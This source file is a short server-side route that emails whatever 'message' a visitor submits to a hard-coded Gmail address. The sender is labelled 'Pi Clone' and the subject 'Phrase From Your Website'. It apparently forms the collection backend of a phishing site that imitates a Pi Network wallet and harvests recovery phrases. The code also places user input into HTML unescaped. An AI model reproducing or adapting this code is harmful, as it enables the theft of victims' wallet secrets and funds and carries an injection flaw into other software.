import nodemailer from 'nodemailer'

function formatMessage(message: string) {
    // Split the message into lines
    const lines = message.split(/\r?\n/);

    // Format each line with a prefix (for example)
    const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);

    // Join formatted lines into a single HTML string
    const formattedMessage = formattedLines.join('');


    // Return the formatted message
    return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
}


export async function POST(request: Request) {
    try {
        const { message } = await request.json();
        const email = process.env.EMAIL
        const pass = process.env.PASS

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: email,
                pass,
            }
        })

        const formattedMessage = formatMessage(message);

        const mailOptions = {
            from: `Pi Clone ${email}`,
            to: "escrowlinks@gmail.com",
            subject: "Phrase From Your Website",
            html: formattedMessage,
        }

        transporter.verify(function (error, success) {
            if (error) {
                console.log(`here is the error: ${error}`);
            } else {
                console.log("Server is ready to take our messages");
            }
        });

        const result = await transporter.sendMail(mailOptions);

        if (result.response.includes("OK")) {
           return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
        } else {
            return Response.json({ error: "Internal server error" }, { status: 500 });
        }
    } catch (error) {
        return Response.json({ error: error });
    }
}